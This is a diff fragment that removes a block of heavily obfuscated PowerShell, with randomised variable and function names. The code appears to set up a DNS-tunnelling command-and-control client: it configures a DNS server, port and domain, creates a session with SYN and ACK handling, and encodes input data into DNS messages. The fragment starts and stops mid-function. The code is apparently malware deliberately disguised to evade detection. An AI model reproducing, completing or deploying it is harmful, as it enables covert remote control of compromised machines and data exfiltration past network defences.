$p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE)}
-        return $p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE
-     }
-        $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl = @{}
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSServer"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSPort"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["FailureThreshold"] = $LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9
-       if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSPort"] -eq ''){$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSPort"] = "53"}
-      $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Tag"] = ""
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"] = ("." + $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"])
-
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["QAUTThuKEwOxlfkxJMpajbDjEYjimrMDbmYvKnzoJ"] = ${function:QAUTThuKEwOxlfkxJMpajbDjEYjimrMDbmYvKnzoJ}
-        $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["riYadVlCvscBwynXLycZptMYaMTZULTeijjSUvzG"] = ${function:riYadVlCvscBwynXLycZptMYaMTZULTeijjSUvzG}
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["uxiZVJEdjIpSqbwHWrkBqwoHnfnhXrHiuTqRERlvn"] = ${function:uxiZVJEdjIpSqbwHWrkBqwoHnfnhXrHiuTqRERlvn}
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["NQTIWXebxrJyMIGLbpZmOHWdUzCTGKTcJkuRwtyr"] = ${function:NQTIWXebxrJyMIGLbpZmOHWdUzCTGKTcJkuRwtyr}
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["yCCPEWIhfilEpyZIsUOQjBgwhXImLHMCfIAHmFbZm"] = ${function:yCCPEWIhfilEpyZIsUOQjBgwhXImLHMCfIAHmFbZm}
-      $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckData"] = ${function:DlZJusBQtizmVfSmioCyAbcFBDmHEBnLKxtqAeeB}
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["pjTtflJoIPIxJgDBhfkqEUDOqoqTiKotzUzjfVrWA"] = ${function:pjTtflJoIPIxJgDBhfkqEUDOqoqTiKotzUzjfVrWA}
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
-$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
-        $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"] = New-Object System.Text.AsciiEncoding
-        $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] = 0
-     
-        $A3ETED3fvbstTSjF9Sb9VDRDtrxKStGbFU5JGY0aj9ueHn7dUhoOu0XVgDTK9wG9KfhqfCSDXdzYryJw1bRwp06bVEU9w8UewwsukOgOKTIlnWWorSNEyZ1bS7AkDyCk7OdWjKQ3VVFlHY1ppMeAsSqLm0qCjUqeFDduiis8l7ccODqnQTvNgaoLonTRQD21oMfYpWg9lToxW3t1U3V5pkWVtLMgc65PR3AoNuUCWHykRVnlmtikmQLfAfjQ4d2cgsBIOO41hEKDW52zj71LyWt5qQpPO43BOAoFlUakXe3cb03fm2TfH0cbd0OpoJzwZ2PFu6PMRG6AC5xvj1Wd6m9Oap4vO6Q2Jj1BC2tItlMkuKhQwYxmgGhps3Lym3nFfZdCMATv1pEGcjBnjBCeUiLksLywIlfvh1evxK1Lh2JCfTpw4E496ppw9rjRPTrdKdDurAi5xDj6243wPSD3daedER9IE1jfJvL3F2I0XgJZKFjmPLf6HrLkJSdzkOvp6K0Yw3u5p4mqZF9ivze57LoiIrdqBSCa65wIm9hdlN8jqRKz65szZRC9bMEmyRl8ZSrGYMRVwWhWIY0bhN79PapKt8s62llKMT1bcMarwx65OivBhtdpDxkhLDW9Q9zC6uQ9TW9oioc1nFmiMtkPT6aF0ZBLUm6jN7Gp92V2MI7tP9MNOXI1WqpYW9LWLGKJZiAvDZJsXRdH15UmUMkb7NEsZrbIlYptCYU5aJbxl4PHowTqHN6jAdOO1imvu79e9gAOMzJVgRE9d7NKfkE0HH3hQaXgc1WA4I8UjKTC70SpJx8ek1pkzWYOpCDr8IUbiwCPTS5GkA6R4jGkXca3t7LOv0GKKpGuEKfOijbAisAlWGWFKtxLU73r5c4zMOyNFt9i5ws41bOpRPxXOIAEg9tKnQZCnrz5n26WhYfiAOGfNQlzrskQDjJB5CR7NcokbWEQpNfBzfHBQf13XndkNT = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["QAUTThuKEwOxlfkxJMpajbDjEYjimrMDbmYvKnzoJ"] -ArgumentList @($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SessionId"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SeqNum"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Tag"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"]))
-  $D3DlXFMBmpTtRlUJoflRZfm5V5XwSlAzu6vJpXseBh39f6sAFGGInrySVRXWOGY0upCdwqKkRfQCM4JFrfs07B53N9RGTeQ5MuvUHc5ooTRY4gZ55fTsrl9y8Y8Di1wSgUR1djvKRf89KuVjJTf8G1UTwCSKbp9HWihPFAz5TVn5HpZ60eNPGooIn7OqNBQzlaGbvQNgpb = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["pjTtflJoIPIxJgDBhfkqEUDOqoqTiKotzUzjfVrWA"] -ArgumentList @($A3ETED3fvbstTSjF9Sb9VDRDtrxKStGbFU5JGY0aj9ueHn7dUhoOu0XVgDTK9wG9KfhqfCSDXdzYryJw1bRwp06bVEU9w8UewwsukOgOKTIlnWWorSNEyZ1bS7AkDyCk7OdWjKQ3VVFlHY1ppMeAsSqLm0qCjUqeFDduiis8l7ccODqnQTvNgaoLonTRQD21oMfYpWg9lToxW3t1U3V5pkWVtLMgc65PR3AoNuUCWHykRVnlmtikmQLfAfjQ4d2cgsBIOO41hEKDW52zj71LyWt5qQpPO43BOAoFlUakXe3cb03fm2TfH0cbd0OpoJzwZ2PFu6PMRG6AC5xvj1Wd6m9Oap4vO6Q2Jj1BC2tItlMkuKhQwYxmgGhps3Lym3nFfZdCMATv1pEGcjBnjBCeUiLksLywIlfvh1evxK1Lh2JCfTpw4E496ppw9rjRPTrdKdDurAi5xDj6243wPSD3daedER9IE1jfJvL3F2I0XgJZKFjmPLf6HrLkJSdzkOvp6K0Yw3u5p4mqZF9ivze57LoiIrdqBSCa65wIm9hdlN8jqRKz65szZRC9bMEmyRl8ZSrGYMRVwWhWIY0bhN79PapKt8s62llKMT1bcMarwx65OivBhtdpDxkhLDW9Q9zC6uQ9TW9oioc1nFmiMtkPT6aF0ZBLUm6jN7Gp92V2MI7tP9MNOXI1WqpYW9LWLGKJZiAvDZJsXRdH15UmUMkb7NEsZrbIlYptCYU5aJbxl4PHowTqHN6jAdOO1imvu79e9gAOMzJVgRE9d7NKfkE0HH3hQaXgc1WA4I8UjKTC70SpJx8ek1pkzWYOpCDr8IUbiwCPTS5GkA6R4jGkXca3t7LOv0GKKpGuEKfOijbAisAlWGWFKtxLU73r5c4zMOyNFt9i5ws41bOpRPxXOIAEg9tKnQZCnrz5n26WhYfiAOGfNQlzrskQDjJB5CR7NcokbWEQpNfBzfHBQf13XndkNT,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSServer"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSPort"]))
- $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["NQTIWXebxrJyMIGLbpZmOHWdUzCTGKTcJkuRwtyr"] -ArgumentList @($D3DlXFMBmpTtRlUJoflRZfm5V5XwSlAzu6vJpXseBh39f6sAFGGInrySVRXWOGY0upCdwqKkRfQCM4JFrfs07B53N9RGTeQ5MuvUHc5ooTRY4gZ55fTsrl9y8Y8Di1wSgUR1djvKRf89KuVjJTf8G1UTwCSKbp9HWihPFAz5TVn5HpZ60eNPGooIn7OqNBQzlaGbvQNgpb))
-if($AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
-  $DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 = $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f[1]
- if($DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 -ne ""){$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["InputData"] = ""}
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckNum"] = $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f[2]
-   $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["MaxMSGDataSize"] = (244 - (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["riYadVlCvscBwynXLycZptMYaMTZULTeijjSUvzG"] -ArgumentList @($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SessionId"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SeqNum"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckNum"],"",$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Tag"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"])).Length)
-         if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
-       return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-    }
-    function CUUxFbaetfSOccrIYLyPHSUXGmrnvjfDnJXSSZnj
-         {
-param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-      if($3s1sLoTSS8mnNNcJeZxihAtjT0zOl69FnuVzF9kUDFC3FmtCGtTLBcBW4KVSI3ygJstQ6Ap3tmxhP90KExryO5kFE2nlzPbJwBcOzwlYXItuLc96GDk8WqIJasEbWPg6CjBWoMwN5UT0BAdgqoreFTpCTNW2a9k6nrj45D6SHIQbr4YF0soTHIqVvtJ5z56JoG7Esqelc6lFcwoFUQYxR3xD0HnNbqJMwdKfceckyBx1OFaurDADUbDVkxOe2XxvrITz8vQjY12CqugiMrO5jOQZOy3L4sbLgdh4hezAAyYAvHioC2rENLs27fONllY5tFV6HDUivBwTcXqBBFtcVDt9EPZZSncBhswDMCsP4MLhjs4Q2IgFymdS1PYh9Nuu9dKbNkWSisIB5N13uaXpleUhytRsvRHcGeIdg74Y50Y0PemOyVOXWihxJ1ey4LN69r9V2rQZJjjlaP3OjS5tvPTnJi1ehdRFT1J3cmjyvxzcxX53Y8mhHBykUngHuyMHpEyn4lehDqndMQUJMVEBtGmUYiicOZu33cNcAMqOOL8Ef51CUJVGc1Zr7BFkkaBG89X7nvPC1EiGUBRKt1COAAUWdB9QSYn1g8chfwI9mnVEbNJyDGaaI5C6xwrvFOrTS13nuKhNC0ZGmMDSmNI9Ptv8BFiMY2tirN3YTOZSYQzXjaLsLs5rohrY4QugSscT9mrNcIqaJjAlQ3WnEuu1Kxtr2yIbfgQuCl7wgV6QT4xU5fth76wIu0m5HDui7Z3Y3VUBPWeZOQrtFS3KwnFzVDLCz5IxW5I19KKdk:Verbose){$MEsBa7kjiO38dxWVWltAfLSMZELrMfiSoRPVAQKMf5q2kSrciLeVTmqXcsqO8nqCwSYu6BY1LKIfLf8Ph4AtNtJMg7Ya3aYUGmUntuE6rkdHA6iRwOoY8umig27uFvTs1q5JvIZcFIuptS7IAlSX2oRKJP2tEiq5Pat9slktET1ndRiytTv35Dv2dCpGK1gcl2nmfhEFXO9LpVVgqv0AfQ1vygQyZlRhew82VlIGgqE000ASni3M5yO5A3XKcQEgAD2eZL6lFyq2sMUSkcG17LtlgDiFqrrN11FgsBuTvmJZUHB5XarixTqahsnlrH8TKE19PS3OdP0mi68qh892JvyD7Gv18Ug8QGWTS22PU39 = $tRue}
-        
-        $vi2smrFau5njpuSJLL4fpOA071q0a1DK6ubGdhkbL4NS1UzE8m2EYjK8ti6Xu4QgkQobB58uohbtB8DYw1ze8eFxT7RJfDYURmWlLJ913RFdnlLFPYfxanUmbbshDQovbBRzOY3MYhtYRdsNFryDKBK4UpJxbAL4JFCDgmEYI4nVCStdZTyDpxkk0nd5L2mEJtKvHSQYoeKuBSTuQR7TeeEp5nB6ga4wabY7dHmS6mwezl19MLIBScYBNE4JxCA61jTXTh8WRZkgRUZ2Rh9QSah4dLEikqVHDMS6QxROPOCGiVpIJQFIEwews0yIntAbWJCjKE8DmZHzSSsz2Qd7iQizqEqtp04sUdaCJBnGir4I4G67X5sQKariyZfEuRjaZ8rFLGZbqrxE355Kpih20mIivUSQwlX3pDDE7VTNUcHUGlP2KPyTGziJoP8FknvwJsFGctxS5Le0pevKz82uvybmyGzR6WdJMwPMDFzSo8J8YdhqqzmJAvOx3xpQUzaBG5Xiq6hAxgJvqnioZhWdOXQIYMzVvQIQYi4kH6ZtvNlD = @()
-$M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc = ""
-   
-    if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["InputData"] -ne $NUll)
-        {
-$p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["yCCPEWIhfilEpyZIsUOQjBgwhXImLHMCfIAHmFbZm"] -ArgumentList @($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["InputData"]))
-         $nFylesYS0EM2WNiWmBLxov3L7G613vCPYeGTtTKwyhw1KkC1tV9uHBsmmmef3TGxZWGoWdR4p1TQZO7wbZFZCU9q1hy9oEXXBKnYuv2Bca3PxgqEnHDFb9ssa7zdGs1ULP8FunXRL3qNfsQnu116UHHwGaa0u8TZ6XaZgmEdPEN6Bm9RzFjE93t8PAFDbyzvGPAfQCyvxXyoKIbfq0HJF5mb2mfeWIbLRTEqgmimUPxShtSA3S7yj0m9cJks1xVx735I3WnL39ENNyEENIyhuBvCBKUKM3g9LEs6XoXl4OfLtgODgIwl5OxZPyxjGN2vEtTGIDTwWtINA3XSKr2bnY6AuXFvu8hHA4ZLidU8FncmeIah4ARJiOkSMg85Le28cEn6wRb0VkRhpdHFNQtYob9WtaLL3Uo1PrV1hid9MqNt77ruCKPaGbj8gxNuZUsSD00Jb2ANiH5HHWcyZkxhMy4koiSQhXP5mtMj1GOb8az7N9Jg9aPGqraFFiYBflD = 0
-     $7ST23BNoQhoqyQZkULHPoqzsISKXIdi3BY2drhWuySeqnDTuOHSORY412yra90ktqSJLYv8ZZhKlZ4lbbowzJ8ecnV0eKXnR0qc1GKSjoUmjJkCcl7A6SIzyJ2jGQuMSFy7oc9p3JTSfbNmhlx5xqoGTVog65U9cnWefndyGPxBr7GYeJWpP6OrB8xMgJGalCvzz1lDsCXDmClXgjbK9Dy = 0
